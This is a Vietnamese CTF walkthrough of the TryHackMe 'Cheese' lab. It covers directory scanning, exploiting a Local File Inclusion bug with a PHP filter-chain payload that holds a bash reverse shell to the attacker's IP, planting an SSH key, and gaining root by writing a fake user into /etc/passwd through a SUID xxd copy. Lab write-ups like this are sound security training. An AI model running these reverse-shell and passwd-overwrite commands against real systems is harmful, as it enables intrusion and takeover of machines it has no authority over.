<div align="center">
    <h1>🧀 TryHackMe Cheese CTF Writeup 🐭</h1>
</div>

## 🚀 1. Khởi động taget

![Start taget](Images/1.png)

## 🔍 2. Recon

- Taget là một trang web `The Cheese Shop`

![Hoangdeptrai](Images/2.png)

- Sử dụng `feroxbuster` quét các file, thư mục ẩn của mục tiêu:

```bash
feroxbuster -u http://10.10.140.148/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,config
```

![Hoangdeptrai](Images/3.png)

- Phát hiện file có tên `messages.html` có dấu hiệu có thể khai thác

![Hoangdeptrai](Images/4.png)

## 🔑 3. Khai thác trang web

- Chèn một số payload phát hiện trang này có thể chứa lỗ hổng `Local File Inclusion` (LFI)

![Hoangdeptrai](Images/5.png)

- Sử dụng tool `php_filter_chain_generator` để tạo payload khai thác RCE dựa trên lỗ hổng này: https://github.com/synacktiv/php_filter_chain_generator

- Sử dụng lệnh sau, kết hợp với ip máy tấn công: `10.8.31.209` để tạo payload: 
```bash 
python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/ 10.8.31.209/4444 0>&1\" '); ?>" | grep "^php" > payload2.txt
```
- Payload được lưu trữ trong file `payload2.txt`, chèn payload vào trường chứa lỗ hổng LFI.

![Hoangdeptrai](Images/6.png)

- Thêm thành công, nghe cổng `4444`, nhận được reverse shell:

![Hoangdeptrai](Images/7.png)

- Tuy nhiên khi thử đọc file `user.txt` thì quyền truy cập bị từ chối, vì vậy cần tạo ssh key với mục đích truy cập từ xa tới user `comte` để có quyền độc file user:

![Hoangdeptrai](Images/8.png)

![Hoangdeptrai](Images/9.png)

- Thêm SSH key vào máy mục tiêu.

![Hoangdeptrai](Images/10.png)

- SSH thành công tới user `comte`

![Hoangdeptrai](Images/11.png)

- Đọc file `user.txt` nhận được flag 🚩

![Hoangdeptrai](Images/12.png)

![Hoangdeptrai](Images/13.png)

## ⚠️ 4. Leo quyền lên root shell

- Dùng lệnh `sudo -l` để kiểm tra quyền thực thi các lệnh sau mà không cần nhập mật khẩu.

![Hoangdeptrai](Images/14.png)

- Trong đó có thể kiểm soát `exploit.timer`, điều này mở ra cơ hội chèn một `service` độc hại
- Nội dung của `exploit.timer` có dạng như sau:

![Hoangdeptrai](Images/15.png)

- `exploit.timer` là một `systemd timer`, có thể chạy một service (`exploit.service`) theo thời gian định sẵn. Nội dung của `exploit.service`:

![Hoangdeptrai](Images/16.png)

- Service này tạo ra một bản sao của `xxd` trong `opt` và cấp cho nó quyền `suid` và quyền `execute`.

- Lợi dụng điều đó, sử dụng câu lệnh sau:
```bash
echo "hoang: :0:0:hoang:/root:/bin/bash" | xxd | /opt/xxd -r - "/etc/passwd" 
```
- Lệnh này tạo thêm một user tên “hoang” vào `etc/password`

![Hoangdeptrai](Images/17.png)

- Sau đó đăng nhập vào user, user này thuộc group id root, ta có thể đọc được file `root.txt`

![Hoangdeptrai](Images/18.png)

![Hoangdeptrai](Images/19.png)

=> Hoàn thành bài lab 🔥🔥🔥

![Hoangdeptrai](Images/20.png)
